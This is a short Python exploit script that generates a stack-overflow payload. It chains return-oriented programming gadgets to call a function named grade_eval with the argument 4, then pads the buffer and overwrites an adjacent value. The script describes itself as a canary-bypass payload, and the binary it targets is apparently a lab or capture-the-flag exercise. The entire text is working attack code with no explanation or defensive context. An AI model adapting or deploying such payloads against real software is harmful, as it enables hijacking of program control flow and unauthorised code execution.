import struct

grade_eval = 0x401677
pop_rdi_ret = 0x4018a3
ret_gadget = 0x4018a4

rop_chain = struct.pack('<Q', pop_rdi_ret)
rop_chain += struct.pack('<Q', 4)
rop_chain += struct.pack('<Q', ret_gadget)
rop_chain += struct.pack('<Q', grade_eval)

payload = rop_chain
payload = payload.ljust(0x100, b'A')
payload += struct.pack('<Q', 0xa8)
payload += b'\n'

with open('payload_canary', 'wb') as f:
    f.write(payload)

print("[*] Canary Bypass ROP Payload Generated!")